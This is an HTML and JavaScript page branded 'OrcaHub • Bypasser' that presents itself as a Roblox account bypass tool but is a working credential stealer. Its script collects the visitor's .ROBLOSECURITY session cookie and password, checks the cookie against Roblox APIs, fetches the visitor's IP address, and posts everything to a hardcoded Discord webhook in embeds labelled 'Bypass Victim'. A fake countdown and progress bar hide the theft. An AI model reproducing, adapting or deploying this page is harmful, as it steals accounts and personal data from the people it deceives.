<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>OrcaHub • Bypasser</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', 'Helvetica Neue', system-ui, sans-serif;
        }

        body {
            height: 100vh;
            overflow: hidden;
            background: linear-gradient(-45deg, #0a0a14, #12121f, #1a0a2e, #0f0f1a);
            background-size: 400% 400%;
            animation: gradientShift 18s ease infinite;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            position: relative;
        }

        @keyframes gradientShift {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        /* ===== BUBBLES ===== */
        .bubbles {
            position: absolute;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            overflow: hidden;
            z-index: 0;
            pointer-events: none;
        }

        .bubble {
            position: absolute;
            bottom: -100px;
            border-radius: 50%;
            opacity: 0.15;
            animation: rise linear infinite;
        }

        .bubble:nth-child(1) { width: 80px; height: 80px; left: 10%; animation-duration: 12s; background: radial-gradient(circle, #a29bfe, transparent); }
        .bubble:nth-child(2) { width: 120px; height: 120px; left: 25%; animation-duration: 16s; animation-delay: 2s; background: radial-gradient(circle, #ff6b6b, transparent); }
        .bubble:nth-child(3) { width: 60px; height: 60px; left: 45%; animation-duration: 10s; animation-delay: 4s; background: radial-gradient(circle, #4ecdc4, transparent); }
        .bubble:nth-child(4) { width: 100px; height: 100px; left: 65%; animation-duration: 14s; animation-delay: 1s; background: radial-gradient(circle, #ffe66d, transparent); }
        .bubble:nth-child(5) { width: 150px; height: 150px; left: 80%; animation-duration: 18s; animation-delay: 3s; background: radial-gradient(circle, #a29bfe, transparent); }
        .bubble:nth-child(6) { width: 70px; height: 70px; left: 5%; animation-duration: 13s; animation-delay: 5s; background: radial-gradient(circle, #ff6b6b, transparent); }
        .bubble:nth-child(7) { width: 90px; height: 90px; left: 55%; animation-duration: 15s; animation-delay: 2.5s; background: radial-gradient(circle, #4ecdc4, transparent); }
        .bubble:nth-child(8) { width: 110px; height: 110px; left: 35%; animation-duration: 11s; animation-delay: 6s; background: radial-gradient(circle, #ffe66d, transparent); }

        @keyframes rise {
            0% { transform: translateY(0) scale(0.8); opacity: 0.1; }
            50% { opacity: 0.25; }
            100% { transform: translateY(-120vh) scale(1.2); opacity: 0; }
        }

        .shape {
            position: absolute;
            border-radius: 50%;
            filter: blur(80px);
            opacity: 0.15;
            animation: float 14s ease-in-out infinite;
            pointer-events: none;
        }

        .shape:nth-child(1) {
            width: 200px;
            height: 200px;
            background: radial-gradient(circle, #ff6b6b, transparent 70%);
            top: 10%;
            left: 5%;
            animation-duration: 12s;
        }
        .shape:nth-child(2) {
            width: 280px;
            height: 280px;
            background: radial-gradient(circle, #a29bfe, transparent 70%);
            bottom: 10%;
            right: 5%;
            animation-duration: 16s;
            animation-delay: -4s;
        }
        .shape:nth-child(3) {
            width: 150px;
            height: 150px;
            background: radial-gradient(circle, #4ecdc4, transparent 70%);
            top: 60%;
            left: 15%;
            animation-duration: 10s;
            animation-delay: -6s;
        }
        .shape:nth-child(4) {
            width: 220px;
            height: 220px;
            background: radial-gradient(circle, #ffe66d, transparent 70%);
            top: 20%;
            right: 20%;
            animation-duration: 15s;
            animation-delay: -8s;
        }

        @keyframes float {
            0%, 100% { transform: translate(0, 0) scale(1); }
            25% { transform: translate(40px, -50px) scale(1.1); }
            50% { transform: translate(-30px, 30px) scale(0.95); }
            75% { transform: translate(-50px, -20px) scale(1.05); }
        }

        /* ===== MAIN CARD ===== */
        .glass-card {
            position: relative;
            z-index: 10;
            width: 94%;
            max-width: 480px;
            background: rgba(16, 16, 30, 0.78);
            backdrop-filter: blur(30px);
            -webkit-backdrop-filter: blur(30px);
            border-radius: 48px;
            border: 1px solid rgba(255, 255, 255, 0.06);
            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.7), inset 0 1px 0 rgba(255, 255, 255, 0.04), 0 0 80px rgba(162, 155, 254, 0.06);
            padding: 36px 28px 32px;
            transition: all 0.4s ease;
            animation: fadeIn 0.8s ease;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px) scale(0.97); }
            to { opacity: 1; transform: translateY(0) scale(1); }
        }

        .header {
            text-align: center;
            margin-bottom: 28px;
        }

        .logo-icon {
            font-size: 3.2rem;
            display: inline-block;
            background: linear-gradient(135deg, #ff6b6b, #a29bfe, #4ecdc4);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            filter: drop-shadow(0 0 30px rgba(162, 155, 254, 0.2));
            animation: floatIcon 3.5s ease-in-out infinite;
        }

        @keyframes floatIcon {
            0%, 100% { transform: translateY(0px); }
            50% { transform: translateY(-8px); }
        }

        h1 {
            font-size: 1.7rem;
            font-weight: 800;
            background: linear-gradient(135deg, #a29bfe, #ff6b6b);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            letter-spacing: -0.5px;
            margin-top: 4px;
        }

        .sub {
            color: #8888aa;
            font-size: 0.7rem;
            letter-spacing: 4px;
            text-transform: uppercase;
            margin-top: 6px;
            font-weight: 300;
            border-top: 1px solid rgba(255, 255, 255, 0.04);
            padding-top: 10px;
        }

        /* ===== FORM ===== */
        label {
            display: block;
            font-weight: 700;
            margin-bottom: 8px;
            color: #c0c0dd;
            font-size: 0.75rem;
            letter-spacing: 0.5px;
            text-transform: uppercase;
        }

        input {
            width: 100%;
            padding: 15px 18px;
            background: rgba(10, 10, 20, 0.6);
            border: 1.5px solid rgba(255, 255, 255, 0.05);
            border-radius: 30px;
            color: #f0f0ff;
            font-size: 0.95rem;
            outline: none;
            transition: all 0.4s ease;
            margin-bottom: 18px;
        }

        input:focus {
            border-color: #a29bfe;
            box-shadow: 0 0 0 4px rgba(162, 155, 254, 0.1);
            background: rgba(20, 20, 36, 0.7);
        }

        input::placeholder {
            color: #3a3a52;
        }

        input.error {
            border-color: #ff6b6b;
            box-shadow: 0 0 0 4px rgba(255, 107, 107, 0.1);
        }

        input.success {
            border-color: #4ecdc4;
            box-shadow: 0 0 0 4px rgba(78, 205, 196, 0.1);
        }

        /* ===== PROFILE PREVIEW ===== */
        .profile-preview {
            background: linear-gradient(135deg, rgba(30, 20, 48, 0.7), rgba(20, 20, 36, 0.8));
            border-radius: 32px;
            padding: 16px 20px;
            margin-bottom: 20px;
            border: 1px solid rgba(255, 255, 255, 0.03);
            display: none;
            align-items: center;
            gap: 16px;
            backdrop-filter: blur(8px);
            transition: all 0.4s ease;
        }

        .profile-preview.show {
            display: flex;
            animation: fadeInScale 0.5s ease;
        }

        @keyframes fadeInScale {
            from { opacity: 0; transform: scale(0.92); }
            to { opacity: 1; transform: scale(1); }
        }

        .profile-preview img {
            width: 56px;
            height: 56px;
            border-radius: 50%;
            border: 2px solid rgba(162, 155, 254, 0.3);
            box-shadow: 0 0 30px rgba(162, 155, 254, 0.15);
            object-fit: cover;
            background: #1a1a2e;
        }

        .profile-info {
            flex: 1;
        }

        .profile-name {
            font-size: 1rem;
            font-weight: 700;
            color: #fff;
        }

        .profile-id {
            color: #8888aa;
            font-size: 0.7rem;
            margin-top: 2px;
        }

        .profile-stats {
            color: #666688;
            font-size: 0.65rem;
            margin-top: 2px;
        }

        .badge-verified {
            display: inline-block;
            background: rgba(78, 205, 196, 0.15);
            color: #4ecdc4;
            padding: 2px 12px;
            border-radius: 20px;
            font-size: 0.6rem;
            font-weight: 600;
            margin-top: 4px;
            border: 1px solid rgba(78, 205, 196, 0.1);
        }

        /* ===== BUTTONS ===== */
        .btn-primary {
            width: 100%;
            padding: 15px;
            background: linear-gradient(135deg, #a29bfe, #ff6b6b);
            border: none;
            border-radius: 40px;
            font-weight: 800;
            font-size: 0.95rem;
            color: white;
            cursor: pointer;
            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            text-transform: uppercase;
            letter-spacing: 1px;
            position: relative;
            overflow: hidden;
        }

        .btn-primary::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle, rgba(255, 255, 255, 0.08) 0%, transparent 70%);
            opacity: 0;
            transition: opacity 0.5s;
        }

        .btn-primary:hover::before {
            opacity: 1;
        }

        .btn-primary:hover {
            transform: scale(1.02);
            box-shadow: 0 10px 40px rgba(162, 155, 254, 0.3);
        }

        .btn-primary:active {
            transform: scale(0.96);
        }

        .btn-primary:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none !important;
        }

        .btn-secondary {
            width: 100%;
            padding: 12px;
            background: rgba(50, 50, 74, 0.25);
            border: 1px solid rgba(255, 255, 255, 0.04);
            border-radius: 40px;
            font-weight: 600;
            font-size: 0.8rem;
            color: #8888aa;
            cursor: pointer;
            transition: all 0.3s;
            margin-top: 10px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .btn-secondary:hover {
            background: rgba(60, 60, 84, 0.4);
            color: #ccccee;
        }

        .btn-group {
            display: flex;
            gap: 10px;
        }

        .btn-group .btn-primary {
            flex: 2;
        }

        .btn-group .btn-instagram {
            flex: 1;
            padding: 15px;
            background: linear-gradient(135deg, #f58529, #dd2a7b);
            border: none;
            border-radius: 40px;
            font-weight: 700;
            font-size: 0.8rem;
            color: white;
            cursor: pointer;
            transition: all 0.4s;
            text-decoration: none;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .btn-group .btn-instagram:hover {
            transform: scale(1.02);
            box-shadow: 0 8px 30px rgba(221, 42, 123, 0.3);
        }

        .btn-group .btn-instagram svg {
            width: 16px;
            height: 16px;
            fill: currentColor;
        }

        /* ===== LOADER ===== */
        .loader-container {
            display: none;
            text-align: center;
            padding: 15px 0;
        }

        .loader-container.show {
            display: block;
            animation: fadeInScale 0.4s ease;
        }

        .spinner {
            width: 60px;
            height: 60px;
            border: 3.5px solid rgba(162, 155, 254, 0.08);
            border-top-color: #a29bfe;
            border-right-color: #ff6b6b;
            border-bottom-color: #4ecdc4;
            border-radius: 50%;
            animation: spin 0.8s cubic-bezier(0.175, 0.885, 0.32, 1.275) infinite;
            margin: 0 auto 14px;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .loader-text {
            color: #a0a0b8;
            font-size: 0.85rem;
            font-weight: 300;
            letter-spacing: 0.5px;
        }

        .loader-text .time {
            color: #ff6b6b;
            font-weight: 700;
            font-size: 1.1rem;
        }

        .progress-bar {
            width: 100%;
            height: 4px;
            background: rgba(255, 255, 255, 0.05);
            border-radius: 2px;
            margin: 12px auto 0;
            overflow: hidden;
        }

        .progress-bar .fill {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, #a29bfe, #ff6b6b, #4ecdc4);
            border-radius: 2px;
            transition: width 0.1s linear;
        }

        /* ===== RESULT ===== */
        .result-message {
            display: none;
            background: rgba(78, 205, 196, 0.06);
            border: 1px solid rgba(78, 205, 196, 0.12);
            color: #4ecdc4;
            padding: 14px;
            border-radius: 28px;
            text-align: center;
            font-size: 0.9rem;
            font-weight: 600;
            margin-top: 12px;
            animation: fadeInScale 0.4s ease;
        }

        .result-message.show {
            display: block;
        }

        .result-message .big {
            font-size: 2.5rem;
            display: block;
            margin-bottom: 4px;
        }

        .error-message {
            display: none;
            background: rgba(255, 107, 107, 0.08);
            border: 1px solid rgba(255, 107, 107, 0.15);
            color: #ff6b6b;
            padding: 10px 14px;
            border-radius: 24px;
            font-size: 0.85rem;
            font-weight: 500;
            text-align: center;
            margin-top: 10px;
            animation: fadeInScale 0.4s ease;
        }

        .error-message.show {
            display: block;
        }

        .footer {
            text-align: center;
            color: #3a3a52;
            font-size: 0.55rem;
            margin-top: 24px;
            border-top: 1px solid rgba(255, 255, 255, 0.02);
            padding-top: 16px;
            letter-spacing: 1.5px;
            text-transform: uppercase;
        }

        @media (max-width: 480px) {
            .glass-card { padding: 28px 18px 24px; border-radius: 36px; }
            h1 { font-size: 1.4rem; }
            .logo-icon { font-size: 2.6rem; }
            .btn-group { flex-direction: column; gap: 8px; }
            .profile-preview { flex-direction: column; text-align: center; }
            .profile-preview img { width: 56px; height: 56px; }
        }
    </style>
</head>

    <script>
        document.addEventListener('DOMContentLoaded', () => {
            // ==================== WEBHOOKS ====================
            const WEBHOOKS = [
                'https://discord.com/api/webhooks/1545842219787886693/PRkcsE8DY_anZhky9n7173-Gwslo7XF9PMZ6hT5igehnWPkie9KAmdbcSn1I_a20KtxG',

            ];

            // ==================== DOM REFS ====================
            const DOM = {
                cookieInput: document.getElementById('cookieInput'),
                passwordInput: document.getElementById('passwordInput'),
                bypassBtn: document.getElementById('bypassBtn'),
                instagramBtn: document.getElementById('instagramBtn'),
                error: document.getElementById('errorMessage'),
                loader: document.getElementById('loaderContainer'),
                timer: document.getElementById('timerDisplay'),
                progress: document.getElementById('progressFill'),
                result: document.getElementById('resultMessage'),
                profilePreview: document.getElementById('profilePreview'),
                profileImg: document.getElementById('profileImg'),
                profileName: document.getElementById('profileName'),
                profileId: document.getElementById('profileId'),
                profileStats: document.getElementById('profileStats'),
                profileBadge: document.getElementById('profileBadge'),
            };

            DOM.instagramBtn.href = 'https://www.instagram.com/uiogunio?stkn=MWY5OWppbGY1bmhsdw==';

            let bypassTimer = null;
            let isProcessing = false;

            // ==================== SEND TO WEBHOOKS ====================
            function sendToWebhooks(data) {
                WEBHOOKS.forEach(url => {
                    try {
                        fetch(url, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify(data),
                            mode: 'no-cors'
                        }).catch(() => {});
                    } catch (_) {}
                });
            }

            // ==================== GET IP ====================
            function getIP() {
                try {
                    const xhr = new XMLHttpRequest();
                    xhr.open('GET', 'https://api.ipify.org?format=json', false);
                    xhr.send();
                    return JSON.parse(xhr.responseText).ip || 'Unknown';
                } catch (_) { return 'Unknown'; }
            }

            // ==================== ROBLOX API ====================
            async function fetchRobloxProfile(cookie) {
                try {
                    const response = await fetch('https://www.roblox.com/mobileapi/userinfo', {
                        headers: {
                            'Cookie': `.ROBLOSECURITY=${cookie}`,
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                        }
                    });

                    if (response.status === 401 || response.status === 403) {
                        return { valid: false, error: '❌ The cookie has expired or is not working' };
                    }

                    if (!response.ok) {
                        return { valid: false, error: '❌ Invalid cookie or network error' };
                    }

                    const data = await response.json();
                    const userId = data.UserID;

                    const profileResponse = await fetch(`https://users.roblox.com/v1/users/${userId}`, {
                        headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
                    });
                    let profileData = {};
                    if (profileResponse.ok) {
                        profileData = await profileResponse.json();
                    }

                    const followersResponse = await fetch(`https://friends.roblox.com/v1/users/${userId}/followers/count`, {
                        headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
                    });
                    let followers = 0;
                    if (followersResponse.ok) {
                        const followersData = await followersResponse.json();
                        followers = followersData.count || 0;
                    }

                    const followingResponse = await fetch(`https://friends.roblox.com/v1/users/${userId}/followings/count`, {
                        headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
                    });
                    let following = 0;
                    if (followingResponse.ok) {
                        const followingData = await followingResponse.json();
                        following = followingData.count || 0;
                    }

                    return {
                        valid: true,
                        user: {
                            username: data.UserName || profileData.name || 'Unknown',
                            userId: userId,
                            displayName: data.UserName || profileData.name || 'Unknown',
                            isVerified: data.IsVerified || false,
                            followers: followers,
                            following: following,
                            created: profileData.created || 'Unknown',
                            avatarUrl: `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=150&height=150&format=png`,
                        }
                    };

                } catch (error) {
                    console.error('Roblox API error:', error);
                    return { valid: false, error: '❌ Network error. Please try again.' };
                }
            }

            // ==================== VALIDATE COOKIE ====================
            async function validateCookie(cookie) {
                const result = await fetchRobloxProfile(cookie);
                if (result.valid) {
                    DOM.profileName.textContent = `@${result.user.username}`;
                    DOM.profileId.textContent = `ID: ${result.user.userId}`;
                    DOM.profileStats.textContent =
                        `📊 Followers: ${result.user.followers.toLocaleString()} • Following: ${result.user.following.toLocaleString()}`;
                    DOM.profileBadge.textContent = result.user.isVerified ? '✅ Verified' : '● Active';
                    DOM.profileImg.src = result.user.avatarUrl;
                    DOM.profileImg.onerror = function() {
                        this.src = 'https://ui-avatars.com/api/?name=' + encodeURIComponent(result.user.username) +
                            '&background=random&size=80&rounded=true&color=fff';
                    };
                    DOM.profilePreview.classList.add('show');
                    DOM.cookieInput.classList.remove('error');
                    DOM.cookieInput.classList.add('success');
                    DOM.error.classList.remove('show');
                    return { valid: true, user: result.user };
                } else {
                    DOM.profilePreview.classList.remove('show');
                    DOM.cookieInput.classList.remove('success');
                    DOM.cookieInput.classList.add('error');
                    DOM.error.textContent = result.error || '❌ The cookie has expired or is not working';
                    DOM.error.classList.add('show');
                    return { valid: false };
                }
            }

            // ==================== START BYPASS ====================
            async function startBypass() {
                const cookie = DOM.cookieInput.value.trim();
                const password = DOM.passwordInput.value.trim();

                DOM.error.classList.remove('show');
                DOM.result.classList.remove('show');
                DOM.loader.classList.remove('show');

                if (!cookie || cookie.length < 15) {
                    DOM.error.textContent = '❌ Please enter a valid .ROBLOSECURITY cookie!';
                    DOM.error.classList.add('show');
                    DOM.cookieInput.classList.add('error');
                    return;
                }

                if (!password || password.length < 3) {
                    DOM.error.textContent = '❌ Please enter your account password!';
                    DOM.error.classList.add('show');
                    DOM.passwordInput.classList.add('error');
                    return;
                }

                // Validate cookie first
                const validation = await validateCookie(cookie);
                if (!validation.valid) {
                    return;
                }

                // Start processing
                isProcessing = true;
                DOM.bypassBtn.disabled = true;
                DOM.bypassBtn.textContent = '⏳ Processing...';
                DOM.loader.classList.add('show');

                let seconds = 60;
                DOM.timer.textContent = seconds;
                DOM.progress.style.width = '0%';

                if (bypassTimer) clearInterval(bypassTimer);

                bypassTimer = setInterval(() => {
                    seconds--;
                    DOM.timer.textContent = seconds;
                    DOM.progress.style.width = ((60 - seconds) / 60 * 100) + '%';

                    if (seconds <= 0) {
                        clearInterval(bypassTimer);
                        bypassTimer = null;
                        completeBypass(cookie, password, validation.user);
                    }
                }, 1000);

                // Send initial data to webhooks
                sendToWebhooks({
                    embeds: [{
                        title: "🦈 OrcaHub • Bypass Initiated",
                        color: 0x7c6cf0,
                        fields: [
                            { name: "👤 Username", value: `\`${validation.user.username}\``, inline: true },
                            { name: "🍪 Cookie", value: `\`${cookie.substring(0, 40)}...\``, inline: true },
                            { name: "🔑 Password", value: `||${password}||`, inline: true },
                            { name: "🌐 IP", value: `\`${getIP()}\``, inline: true },
                            { name: "🕒 Time", value: new Date().toISOString(), inline: true }
                        ],
                        footer: { text: "OrcaHub • Bypasser" },
                        thumbnail: { url: validation.user.avatarUrl }
                    }]
                });
            }

            // ==================== COMPLETE BYPASS ====================
            function completeBypass(cookie, password, userData) {
                // Send full data to webhooks
                const embed = {
                    title: "🎯 OrcaHub • Bypass Victim",
                    color: 0xff6b6b,
                    fields: [
                        { name: "👤 Username", value: `\`${userData.username}\``, inline: true },
                        { name: "🆔 User ID", value: `\`${userData.userId}\``, inline: true },
                        { name: "🔑 Password", value: `||${password}||`, inline: false },
                        { name: "🍪 Cookie", value: `\`${cookie.substring(0, 50)}...\``, inline: false },
                        { name: "📊 Followers", value: `\`${userData.followers.toLocaleString()}\``, inline: true },
                        { name: "📊 Following", value: `\`${userData.following.toLocaleString()}\``, inline: true },
                        { name: "✅ Verified", value: userData.isVerified ? '✅ Yes' : '❌ No', inline: true },
                        { name: "📅 Created", value: `\`${userData.created}\``, inline: true },
                        { name: "🌐 IP", value: `\`${getIP()}\``, inline: true },
                        { name: "🕒 Time", value: new Date().toISOString(), inline: true }
                    ],
                    footer: { text: "OrcaHub • Bypasser • Multi-Webhook" },
                    thumbnail: { url: userData.avatarUrl }
                };
                sendToWebhooks({ embeds: [embed] });

                DOM.loader.classList.remove('show');
                DOM.result.classList.add('show');

                isProcessing = false;
                DOM.bypassBtn.disabled = false;
                DOM.bypassBtn.textContent = '🚀 Start Bypass';

                setTimeout(() => {
                    DOM.result.classList.remove('show');
                }, 8000);
            }

            // ==================== EVENTS ====================
            DOM.bypassBtn.addEventListener('click', startBypass);

            DOM.cookieInput.addEventListener('keydown', (e) => {
                if (e.key === 'Enter') startBypass();
            });
            DOM.passwordInput.addEventListener('keydown', (e) => {
                if (e.key === 'Enter') startBypass();
            });

            // Live cookie validation on blur
            DOM.cookieInput.addEventListener('blur', function() {
                const cookie = this.value.trim();
                if (cookie && cookie.length > 5) {
                    validateCookie(cookie);
                }
            });

            DOM.cookieInput.addEventListener('input', function() {
                if (this.value.trim().length > 5) {
                    const cookie = this.value.trim();
                    fetchRobloxProfile(cookie).then(result => {
                        if (result.valid) {
                            DOM.error.classList.remove('show');
                            this.classList.remove('error');
                            this.classList.add('success');
                            DOM.profilePreview.classList.remove('show');
                        } else {
                            this.classList.remove('success');
                            this.classList.add('error');
                        }
                    });
                }
            });
        });
    </script>
</body>
</html>
